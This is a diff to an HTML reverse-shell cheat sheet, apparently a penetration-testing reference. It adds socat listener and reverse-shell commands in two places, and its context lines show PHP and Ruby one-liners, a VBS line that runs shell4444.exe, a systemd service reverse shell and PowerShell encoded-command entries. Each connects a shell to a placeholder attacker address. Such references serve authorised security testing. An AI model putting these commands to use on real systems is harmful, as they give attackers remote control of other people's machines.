@@ -63,7 +63,6 @@ Call oS.Run(&quot;win.com cmd.exe /c c:\Inetpub\shell4444.exe&quot;,0,True)
         </li>
     </ul>
 
-
     <h2>Linux Reverse Shells</h2>
 
     <h4>netcat reverse shell</h4>
@@ -89,9 +88,21 @@ Call oS.Run(&quot;win.com cmd.exe /c c:\Inetpub\shell4444.exe&quot;,0,True)
     <li>php -r &quot;\$sock=fsockopen(\&quot;&lt;ip address&gt;\&quot;,&lt;port&gt;);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&quot;</li>
     <li>ruby -r socket -e &quot;f=TCPSocket.open(\&quot;&lt;ip address&gt;\&quot;,&lt;port&gt;).to_i;exec sprintf(\&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&quot;,f,f,f)&quot;</li>
 
+    <h4>socat reverse shell</h4>
+    <table>
+        <tr>
+            <td>Set up listener</td>
+            <td>socat file:`tty`,raw,echo=0 tcp-listen:80</td>
+        </tr>
+        <tr>
+            <td>Execute reverse shell</td>
+            <td>socat tcp-connect:&lt;ip address&gt;:&lt;port&gt; exec:/bin/sh,pty,stderr,setsid,sigint,sane</td>
+        </tr>
+    </table>
+
     <br>
 
-    <h4>Linux service reverse shell</h4>
+    <h4>Reverse shell using linux service</h4>
     <pre>
 [Service]
 Type=notify
@@ -164,5 +175,17 @@ systemctl start &lt;service&gt;
                 <li>powershell -e &lt;Base64 Encoded Shell&gt;</li>
                 <li>powershell -EncodedCommand &lt;Base64 Encoded Shell&gt;</li>
             </td>
+        </tr>
+    </table>
+
+        <h4>socat reverse shell</h4>
+    <table>
+        <tr>
+            <td>Set up listener</td>
+            <td>socat file:`tty`,raw,echo=0 tcp-listen:80</td>
+        </tr>
+        <tr>
+            <td>Execute reverse shell</td>
+            <td>socat tcp-connect:&lt;ip address&gt;:&lt;port&gt; exec:/bin/sh,pty,stderr,setsid,sigint,sane</td>
         </tr>
     </table>
